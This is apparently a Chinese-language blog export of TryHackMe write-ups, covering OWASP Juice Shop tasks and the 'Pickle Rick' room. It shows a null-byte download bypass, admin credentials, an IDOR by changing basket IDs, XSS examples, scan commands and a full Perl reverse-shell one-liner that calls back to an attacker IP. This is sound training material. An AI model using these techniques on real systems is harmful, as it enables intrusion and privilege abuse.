<p>使用修改之后的密码登录Jim的账户（<a class="link"   href="mailto:&#106;&#105;&#109;&#x40;&#106;&#117;&#x69;&#99;&#101;&#x2d;&#x73;&#104;&#x2e;&#111;&#x70;" >&#106;&#105;&#109;&#x40;&#106;&#117;&#x69;&#99;&#101;&#x2d;&#x73;&#104;&#x2e;&#111;&#x70; <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>），也能得到一个flag（本文中的任务并未要求获得该flag）</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221210213237975.png"
                      alt="image-20221210213237975"
                ></p>
<blockquote>
<p>da36b345cb3d661cf985428df8c2d8756c362e56</p>
</blockquote>
<h2 id="Task-5-敏感信息泄露-实验"><a href="#Task-5-敏感信息泄露-实验" class="headerlink" title="Task 5 敏感信息泄露-实验"></a>Task 5 敏感信息泄露-实验</h2><p>Web 应用程序应该安全可靠地存储和传输敏感数据，但在某些情况下，开发人员可能没有正确保护好这些敏感数据，从而使其容易被泄露。</p>
<p>大多数时候，数据保护并未在整个 Web 应用程序中得到一致应用，这就使得某些页面能够直接被公众所访问，所以一些敏感信息可能会在开发人员不知情的情况下已经泄露给公众访问人员，从而可能导致目标Web应用程序容易受到非法攻击。</p>
<p><strong>答题</strong></p>
<p><strong>Question #1:</strong> <strong>Access the Confidential Document!</strong>–访问机密文件！</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221210214237801.png"
                      alt="image-20221210214237801"
                ></p>
<p>导航至“About Us-关于我们”页面，将鼠标悬停在“查看我们的使用条款”上。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221210214326687.png"
                      alt="image-20221210214326687"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221210214624771.png"
                      alt="image-20221210214624771"
                ></p>
<p>点击上图中的链接将跳转到 <a class="link"   href="http://10.10.102.75/ftp/legal.md" >http://10.10.102.75/ftp/legal.md <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 页面（这将自动执行文件下载操作），在此页面修改url以导航到&#x2F;ftp&#x2F; 目录，你会发现该目录是一个公开的可访问页面！</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221210214719502.png"
                      alt="image-20221210214719502"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221210214807968.png"
                      alt="image-20221210214807968"
                ></p>
<p>我们尝试在&#x2F;ftp&#x2F;页面中 下载包含敏感信息的 <em><strong>acquisitions.md</strong></em>文件。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221210215200468.png"
                      alt="image-20221210215200468"
                ></p>
<p>下载完成后，我们可以导航到之前的页面以接收对应的flag。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221210215341034.png"
                      alt="image-20221210215341034"
                ></p>
<blockquote>
<p>edf9281222395a1c5fee9b89e32175f1ccf50c5b</p>
</blockquote>
<p><strong>Question #2:</strong> <strong>Log into MC SafeSearch’s account!</strong>–登录 MC SafeSearch 的帐户！</p>
<p>TryHackMe在此提供了一个YouTube视频链接，当我们看完对应的歌曲MV视频后，我们可以得到一些关键信息：目标用户的密码本应是“<em><strong>Mr. Noodles</strong></em>”，但他已经将一些“元音字母替换为零”，这意味着将字母<code>o</code>替换为<code>0</code>，所以我们可知<code>mc.safesearch@juice-sh.op</code>帐户的密码是“<em><strong>Mr. N00dles</strong></em>”</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221210221014132.png"
                      alt="image-20221210221014132"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221210221103738.png"
                      alt="image-20221210221103738"
                ></p>
<p>tips：以上两个截图中所显示的字幕 是自动生成的字幕（不一定非常准确）。</p>
<p>使用已知的密码登录MC SafeSearch的帐户（<code>mc.safesearch@juice-sh.op</code>、<code>Mr. N00dles</code>），并获得一个flag：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221210221605624.png"
                      alt="image-20221210221605624"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221210221726421.png"
                      alt="image-20221210221726421"
                ></p>
<blockquote>
<p>66bdcffad9e698fd534003fbb3cc7e2b7b55d7f0</p>
</blockquote>
<p><strong>Question #3:</strong> <strong>Download the Backup file!</strong>–下载备份文件！</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221210222240373.png"
                      alt="image-20221210222240373"
                ></p>
<p>我们现在返回至之前所提到的 <a class="link"   href="http://10.10.102.75/ftp/" >http://10.10.102.75/ftp/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 页面并尝试下载 <code>package.json.bak</code>文件，但我们接收到了一个403状态码提示，该提示告诉我们只允许下载 <code>.md</code> 和 <code>.pdf</code> 格式的文件。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221210222224161.png"
                      alt="image-20221210222224161"
                ></p>
<p>为了解决这个问题，我们将使用一个名为“Poison Null Byte”的字符来进行绕过，该空字节内容如下所示：<code>%00</code>。</p>
<p>注意：由于我们在此处是使用 url 来下载文件，因此我们需要将空字节也编码为 url 编码格式；经过url编码处理的Poison Null Byte 将变为：<code>%2500</code>。</p>
<p>我们在url（ <a class="link"   href="http://10.10.102.75/ftp/package.json.bak" >http://10.10.102.75/ftp/package.json.bak <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> ）末尾添加空字节以及 <code>.md</code> ，就能绕过403 错误提示以完成文件下载操作！</p>
<div class="highlight-container" data-rel="Http"><figure class="iseeu highlight http"><table><tr><td class="code"><pre><span class="line">http://10.10.102.75/ftp/package.json.bak%2500.md</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221210223103652.png"
                      alt="image-20221210223103652"
                ></p>
<p>原理：Poison Null Byte 实际上是一个 NULL 终止符，在字符串中的某个字节处放置一个 NULL 字符，那么该字符串将告诉目标服务器在NULL字符处终止读取，然后字符串的其余部分将被置为空。</p>
<p>返回主页面以获得一个flag：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221210223624952.png"
                      alt="image-20221210223624952"
                ></p>
<blockquote>
<p>bfc1e6b4a16579e85e06fee4c36ff8c02fb13795</p>
</blockquote>
<h2 id="Task-6-损坏的访问控制-越权-实验"><a href="#Task-6-损坏的访问控制-越权-实验" class="headerlink" title="Task 6 损坏的访问控制(越权)-实验"></a>Task 6 损坏的访问控制(越权)-实验</h2><p>现代系统将允许多个用户访问不同的页面，其中管理员用户可以使用管理页面以方便编辑、添加和删除网站的不同元素，当你使用 Weebly 或 Wix 等程序构建网站时，你就可能会用到管理员页面来辅助建站。</p>
<p>当发现损坏的访问控制漏洞或错误时，它将被归类为以下两种类型之一：</p>
<ul>
<li>水平（横向）越权：当用户可以执行 操作或访问具有<em><strong>相同权限级别</strong></em>的另一个用户的数据时发生。</li>
<li>垂直（纵向）越权：当用户可以执行 操作或访问具有<em><strong>更高权限级别</strong></em>的另一个用户的数据时发生。</li>
</ul>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221210224427073.png"
                      alt="image-20221210224427073"
                ></p>
<p><strong>答题</strong></p>
<p><strong>Question #1:</strong> <strong>Access the administration page!</strong>–访问管理页面！</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221211185152085.png"
                      alt="image-20221211185152085"
                ></p>
<p>首先，我们将在Firefox浏览器中打开<strong>Debugger</strong>（调试器）或者在谷歌浏览器中打开<strong>Sources</strong>，Debugger可以通过在浏览器中打开Web开发者工具找到，找到Debugger之后再刷新页面，找到并查看main-es2015.js文件，要将其内容转换为我们可以阅读的格式，单击 { } 按钮即可。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221211182647790.png"
                      alt="image-20221211182647790"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221211183254858.png"
                      alt="image-20221211183254858"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221211182819067.png"
                      alt="image-20221211182819067"
                ></p>
<p>现在在上图的js文件内容中 搜索关键词“admin”，你可以找到几个包含“admin”的不同代码段，最终我们所发现的是“path: administration”，它指代了一个名为“&#x2F;#&#x2F;administration”的页面路径，但是在未登录的情况下无法进入该路径相关页面。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221211184207274.png"
                      alt="image-20221211184207274"
                ></p>
<p>由于这是一个管理员页面，因此我们需要在管理员帐户中才能查看它。阻止普通用户访问管理员界面的一个好方法是 只加载普通用户所需要使用的部分应用程序，这可以防止泄露一些敏感信息或阻止查看管理页面等。</p>
<p>接下来根据前文所得的信息，我们先登录到管理员账户，再访问“&#x2F;#&#x2F;administration”页面，获取对应的flag：</p>
<blockquote>
<p><a class="link"   href="mailto:&#97;&#x64;&#x6d;&#x69;&#x6e;&#x40;&#106;&#117;&#x69;&#x63;&#101;&#45;&#x73;&#x68;&#46;&#111;&#x70;" >&#97;&#x64;&#x6d;&#x69;&#x6e;&#x40;&#106;&#117;&#x69;&#x63;&#101;&#45;&#x73;&#x68;&#46;&#111;&#x70; <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>admin123</p>
</blockquote>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221211184945260.png"
                      alt="image-20221211184945260"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221211185101249.png"
                      alt="image-20221211185101249"
                ></p>
<blockquote>
<p>946a799363226a24822008503f5d1324536629a0</p>
</blockquote>
<p><strong>Question #2:</strong> <strong>View another user’s shopping basket!</strong>–查看其他用户的购物篮！</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221211191009253.png"
                      alt="image-20221211191009253"
                ></p>
<p>开启BurpSuite，在管理员帐户登录后的界面中单击“你的购物篮”，然后在Burp页面转发捕获到的请求，直到你看到<code>GET /rest/basket/1 HTTP/1.1</code> ，接着使用Burp将<code>/basket/</code>之后的数字 1 更改为 2，现在和该请求所对应的页面 就可以显示 UserID为2 的用户购物篮！</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221211190631857.png"
                      alt="image-20221211190631857"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221211190724073.png"
                      alt="image-20221211190724073"
                ></p>
<p>使用Burp转发所有请求，然后在浏览器中 查看修改之后的请求所对应的页面以便得到一个flag。</p>
<p><em><strong>UserID为2 的用户购物篮（下图是通过Burp修改请求才得到的界面）：</strong></em></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221211190847609.png"
                      alt="image-20221211190847609"
                ></p>
<p><em><strong>UserID为1 的用户购物篮（admin用户的原始购物车界面）：</strong></em></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221211191139272.png"
                      alt="image-20221211191139272"
                ></p>
<blockquote>
<p>41b997a36cc33fbe4f0ba018474e19ae5ce52121</p>
</blockquote>
<p><strong>Question #3: Remove all 5-star reviews!</strong>–删除所有 5 星评论！</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221211192033307.png"
                      alt="image-20221211192033307"
                ></p>
<p>在管理员账户下：再次导航到  <a class="link"   href="http://10.10.103.124/#/administration" >http://10.10.103.124/#/administration <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>  页面，然后单击带有 5 星评论旁边的垃圾桶图标！这将删除所有5星评论。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221211191837902.png"
                      alt="image-20221211191837902"
                ></p>
<p>完成上述操作之后，得到一个flag：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221211191940560.png"
                      alt="image-20221211191940560"
                ></p>
<blockquote>
<p>50c97bcce0b895e446d61c83a21df371ac2266ef</p>
</blockquote>
<h2 id="Task-7-跨站点脚本-XSS漏洞-实验"><a href="#Task-7-跨站点脚本-XSS漏洞-实验" class="headerlink" title="Task 7 跨站点脚本(XSS漏洞)-实验"></a>Task 7 跨站点脚本(XSS漏洞)-实验</h2><p>XSS 或跨站点脚本是一种允许攻击者在 Web 应用程序中运行 恶意javascript脚本 的漏洞，是 Web 应用程序中最常见的漏洞类型之一；XSS的复杂度从简单到极其困难都有所包含，因为每个 Web 应用程序可能会以不同的方式来解析具有查询功能的js代码。</p>
<p>XSS攻击主要分为三种类型：</p>
<p><strong>基于DOM的XSS（特殊的反射型XSS）</strong>：基于DOM的XSS (Document Object Model-based Cross-site Scripting) 可以利用 HTML 环境执行恶意 javascript代码，这种类型的XSS攻击通常会使用 <code>&lt;script&gt;&lt;/script&gt;</code> HTML 标记然后结合 <em><strong>支持动态代码执行的接收器</strong></em> 来构造Payload，此外，这种类型的XSS攻击还可以通过直接修改DOM元素来构造Payload。</p>
<p>一些常见的接收器：</p>
<div class="highlight-container" data-rel="Txt"><figure class="iseeu highlight txt"><table><tr><td class="code"><pre><span class="line">document.write()</span><br><span class="line">document.writeln()</span><br><span class="line">document.domain</span><br><span class="line">someDOMElement.innerHTML</span><br><span class="line">someDOMElement.outerHTML</span><br><span class="line">someDOMElement.insertAdjacentHTML</span><br><span class="line">someDOMElement.onevent</span><br></pre></td></tr></table></figure></div>

<p>例子:利用innerHTML篡改页面</p>
<div class="highlight-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-handlebars"><span class="language-xml">document.body.innerHTML=&quot;<span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">visibility:visible;</span>&gt;</span><span class="tag">&lt;<span class="name">h1</span>&gt;</span>This is DOM XSS<span class="tag">&lt;/<span class="name">h1</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span>&quot;;</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></div>

<p><strong>持久型(存储型)XSS（服务器端）</strong>：持久型XSS 是在服务器加载包含它的页面时才会运行的 恶意javascript脚本（js脚本已插入到网站数据库中），当服务器在将用户所输入的数据上传（upload）到网站页面 而未对用户数据进行正确过滤时，就可能会发生这种XSS攻击，此类攻击手段在博客文章页面很常见。</p>
<p><strong>反射型XSS（客户端）</strong>：反射型XSS 是在 Web 应用程序的客户端运行的恶意javascript脚本（因受害者点击恶意链接而导致恶意js脚本运行），常见于目标服务器未正确过滤搜索（search）数据时。</p>
<p><strong>答题</strong></p>
<p><strong>Question #1:</strong> <strong>Perform a DOM XSS!</strong>–执行基于DOM的XSS攻击</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221211204425039.png"
                      alt="image-20221211204425039"
                ></p>
<p>我们将利用带有 javascript 警告标记(alert tag)的 iframe 元素来构造攻击载荷（以下payload中包含xss单词的符号是反引号而不是单引号）：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221211203130320.png"
                      alt="image-20221211203130320"
                ></p>
<p><em><strong>注意</strong></em>：我们在此处利用的是<code>iframe</code>元素，它是Web应用程序中常见的 HTML 元素之一，还有其他能够产生相同攻击效果的HTML元素；使用以上这种Payload类型的XSS也可称为XFS（跨框架脚本-Cross-Frame Scripting），XFS是能够在 Web 应用程序中被检测到的 XSS 的最常见形式之一，一个允许用户修改 <code>iframe</code> 或者其他DOM元素的网站很容易受到XSS攻击。</p>
<p><em><strong>原理</strong></em>：当用户在搜索栏中输入关键字进行搜索时，这通常会导致客户端向服务器发送相关的请求，然后服务器将根据搜索栏中的关键字来返回一些相关信息；如果web应用程序没有做一些正确的“用户输入”过滤，那么我们就能够利用搜索栏来执行 XSS 攻击。</p>
<p>将XSS Payload输入到搜索栏并按下回车键，这将触发并弹出一个警告框并将显示对应的flag内容。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221211203417837.png"
                      alt="image-20221211203417837"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221211204319635.png"
                      alt="image-20221211204319635"
                ></p>
<blockquote>
<p>9aaf4bbea5c30d00a1f5bbcfce4db6d4b0efe0bf</p>
</blockquote>
<p><strong>Question #2:</strong> <strong>Perform a persistent XSS!</strong>–执行持久型(存储型)XSS攻击</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221211210357475.png"
                      alt="image-20221211210357475"
                ></p>
<p>首先，登录到管理员帐户，然后导航到“Last Login IP”页面。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221211210506830.png"
                      alt="image-20221211210506830"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221211210540469.png"
                      alt="image-20221211210540469"
                ></p>
<p>我们可以从上图看到，最后登陆的ip地址显示为0.0.0.0 ，现在我们注销此次登陆，这样就能记录一个新的“最后登陆ip”，同时还要确保打开 Burp 拦截，以便我们捕获这个注销登陆的请求。</p>
<p>然后我们在Burp中转到Headers 选项卡，在其中添加一个新的header项。（以下payload中包含xss单词的符号是反引号而不是单引号）</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221211213606372.png"
                      alt="image-20221211213606372"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221211214658568.png"
                      alt="image-20221211214658568"
                ></p>
<p>修改完成之后，在Burp中将请求转发给目标服务器即可。<br>当我们重新登录管理员帐户并再次导航到“Last Login IP”页面时，我们就能看到一个 XSS 警告框，并能获取对应的flag。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221211215007054.png"
                      alt="image-20221211215007054"
                ></p>
<blockquote>
<p>149aa8ce13d7a4a8a931472308e269c94dc5f156</p>
</blockquote>
<p><strong>Question #3:</strong> <strong>Perform a reflected XSS!</strong>–执行反射型XSS攻击</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221211220959120.png"
                      alt="image-20221211220959120"
                ></p>
<p>首先，我们需要在正确的页面上执行反射型XSS！所以我们需要登录到管理员帐户并导航至“订单历史记录”页面。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221211215258168.png"
                      alt="image-20221211215258168"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221211215606014.png"
                      alt="image-20221211215606014"
                ></p>
<p>在上图，你可以看到一个“Truck-卡车”图标，点击图标将会导航至订单的追踪结果页面，在该追踪结果界面你还能看到一个与订单配对的 ID。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221211215831384.png"
                      alt="image-20221211215831384"
                ></p>
<p>我们可以用以下Payload代替上图url栏中的id值。（以下payload中包含xss单词的符号是反引号而不是单引号）</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221211203130320.png"
                      alt="image-20221211203130320"
                ></p>
<p>提交 URL 后，刷新页面，你将收到一个 XSS 警告框，并能获取到对应的flag。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221211220922027.png"
                      alt="image-20221211220922027"
                ></p>
<blockquote>
<p>23cefee1527bde039295b2616eeb29e1edc660a0</p>
</blockquote>
<h2 id="Task-8-计分板"><a href="#Task-8-计分板" class="headerlink" title="Task 8 计分板"></a>Task 8 计分板</h2><p>如果你想尝试本文未涵盖的一些更难的挑战，请查看 Juice-shop 上的**&#x2F;#&#x2F;score-board&#x2F;**部分，在该部分你可以看到你已经完成的任务 以及 其他本文未涵盖的不同难度的任务。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221208221153945.png"
                      alt="image-20221208221153945"
                ></p>
<p><strong>答题</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221208221225637.png"
                      alt="image-20221208221225637"
                ></p>
<p>使用攻击机访问&#x2F;#&#x2F;score-board&#x2F;页面，获取对应的flag内容：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221210183807295.png"
                      alt="image-20221210183807295"
                ></p>
<blockquote>
<p>7efd3174f9dd5baa03a7882027f2824d2f72d86e</p>
</blockquote>
]]></content>
      <categories>
        <category>TryHackMe笔记</category>
      </categories>
      <tags>
        <tag>TryHackMe</tag>
        <tag>Web安全</tag>
      </tags>
  </entry>
  <entry>
    <title>THM-Pickle Rick-练习</title>
    <url>/2024/01/27/THM-Pickle%20Rick-%E7%BB%83%E4%B9%A0/</url>
    <content><![CDATA[<p>本文相关的TryHackMe实验房间链接：<a class="link"   href="https://tryhackme.com/room/picklerick" >https://tryhackme.com/room/picklerick <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<h2 id="任务目标"><a href="#任务目标" class="headerlink" title="任务目标"></a>任务目标</h2><p>找到3个成分，将帮助瑞克制作他的药水，把自己从一个泡菜变回人类。</p>
<p>目标地址<a class="link"   href="https://10-10-253-251.p.thmlabs.com/" >https:&#x2F;MACHINE-IP.p.thmlabs.com <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 此处为：<a class="link"   href="https://10-10-253-251.p.thmlabs.com/" >https://10-10-253-251.p.thmlabs.com/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<h2 id="实践操作"><a href="#实践操作" class="headerlink" title="实践操作"></a>实践操作</h2><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">端口扫描</span><br><span class="line">nmap -T4 -sC -sV -p- 10.10.253.251  </span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20220927120845431.png"
                      alt="image-20220927120845431"
                ></p>
<blockquote>
<p>目标开放了两个端口：22&#x2F;tcp ssh服务    80&#x2F;tcp http服务</p>
</blockquote>
<p>访问目标网站的http服务，查看网站源代码，获取到关于用户名的提示：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20220927121045775.png"
                      alt="image-20220927121045775"
                ></p>
<blockquote>
<p>用户名为：R1ckRul3s</p>
</blockquote>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">目录和文件扫描</span><br><span class="line">gobuster dir -u http://10.10.253.251 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x php,sh,txt,cgi,html,css,js,py</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20220927122325445.png"
                      alt="image-20220927122325445"
                ></p>
<blockquote>
<p>扫描到 </p>
<p>&#x2F;index.html  </p>
<p>&#x2F;login.php  </p>
<p>&#x2F;assets   </p>
<p>&#x2F;portal.php   </p>
<p>&#x2F;robots.txt</p>
</blockquote>
<p>去目标站点访问以上页面和文件：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">index.html是首页，和之前访问网站时的默认页面一样，</span><br><span class="line">login.php是登陆页面（这个要关注一下），</span><br><span class="line">assets目录下有一些网站资源文件（看了一下没啥特别的），</span><br><span class="line">portal.php访问时会自动跳转到之前的login.php页面，估计要登陆后才能看到，</span><br><span class="line">robot.txt文件有一串字符为Wubbalubbadubdub，可能是登陆密码。</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20220927123458547.png"
                      alt="image-20220927123458547"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20220927123534743.png"
                      alt="image-20220927123534743"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20220927123419683.png"
                      alt="image-20220927123419683"
                ></p>
<p>在登陆页面尝试使用之前得到的用户名以及在robots文件中得到的字符进行登陆，发现能够登陆成功，并给出一个命令执行面板：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20220927124227553.png"
                      alt="image-20220927124227553"
                ></p>
<p>利用命令面板，输入命令查找文件信息，找到第一个flag（无法通过cat命令查看，但可通过url路径进行访问）：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20220927124643763.png"
                      alt="image-20220927124643763"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20220927124733364.png"
                      alt="image-20220927124733364"
                ></p>
<blockquote>
<p>第一个flag是：mr. meeseek hair</p>
</blockquote>
<p>继续探索命令面板，第一次使用ls命令还看到了一些其他文件，现在尝试访问一下，denied.php是一个被禁止访问的页面，clue.txt提示我们在文件系统中查找其他成分：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20220927125210820.png"
                      alt="image-20220927125210820"
                ></p>
<p>利用网站所提供的命令面板建立反向shell（这里试了很多语言的反向shell，发现Perl语言的shell可行），首先在攻击机终端建立监听器，查看该服务器是否支持Perl（命令：which Perl），再执行Perl的反向shell命令：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20220927131746063.png"
                      alt="image-20220927131746063"
                ></p>
<p>反向shell命令内容参考（修改ip、端口和攻击机匹配）：<a class="link"   href="https://github.com/security-cheatsheet/reverse-shell-cheatsheet" >https://github.com/security-cheatsheet/reverse-shell-cheatsheet <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">perl -e &#x27;use Socket;$i=&quot;10.14.30.69&quot;;$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));</span><br><span class="line">if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&#x27;</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20220927133646735.png"
                      alt="image-20220927133646735"
                ></p>
<p>成功建立反向shell，查找flag即可，第一个flag我们已经知道 我们找其他的（当前目录没有目标flag时，尝试找&#x2F;home &#x2F;root等关键目录）：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20220927133924593.png"
                      alt="image-20220927133924593"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20220927134805181.png"
                      alt="image-20220927134805181"
                ></p>
<blockquote>
<p>第二个flag是：1 jerry tear</p>
</blockquote>
<blockquote>
<p>上图中的 cat ‘second ingredients’ 之所以加单引号是因为该名称中间存在空格</p>
<p>如果不加引号 则只能识别到second而不是second ingredients</p>
<p>也可以尝试用其他方式处理：second\ ingredients或者”second ingredients”</p>
</blockquote>
<p>尝试cd &#x2F;root，发现无法移动到&#x2F;root目录下，</p>
<p>输入sudo -l 列出目前用户可执行与无法执行的指令，发现我们可以通过sudo免密码使用root用户：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20220927135922502.png"
                      alt="image-20220927135922502"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20220927135847160.png"
                      alt="image-20220927135847160"
                ></p>
<blockquote>
<p>第三个flag是：fleeb juice</p>
</blockquote>
<p>关于第二个flag和第三个flag的其他解法</p>
<p>利用登陆之后网页所提供的命令面板：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入ls会显示当前网站根目录下的目录及文件</span><br><span class="line">输入sudo -l列出目前用户可执行与无法执行的指令，发现我们可以通过sudo免密码使用root用户</span><br><span class="line"></span><br><span class="line">此时，可以使用sudo ls命令找到/home目录以及/root下的flag文件，</span><br><span class="line">对于/home目录，也可以通过组合命令（cd /home;ls;pwd、cd /home/rick/;ls;pwd）去找flag文件   </span><br><span class="line"></span><br><span class="line">如果想通过网站url访问flag文件内容，可以使用sudo cp命令复制flag文件到网站根目录，涉及的命令如下：</span><br><span class="line">sudo ls /home</span><br><span class="line">sudo ls /home/rick/</span><br><span class="line">sudo cp /home/rick/second\ ingredients ./second.txt   </span><br><span class="line">sudo ls /root</span><br><span class="line">sudo cp /root/3rd.txt . </span><br><span class="line"></span><br><span class="line">如果想直接在网页的命令面板界面查看flag内容，可以使用以下命令（当然前提还是要先找到flag文件的位置）：</span><br><span class="line">less /home/rick/second\ ingredients</span><br><span class="line">sudo less 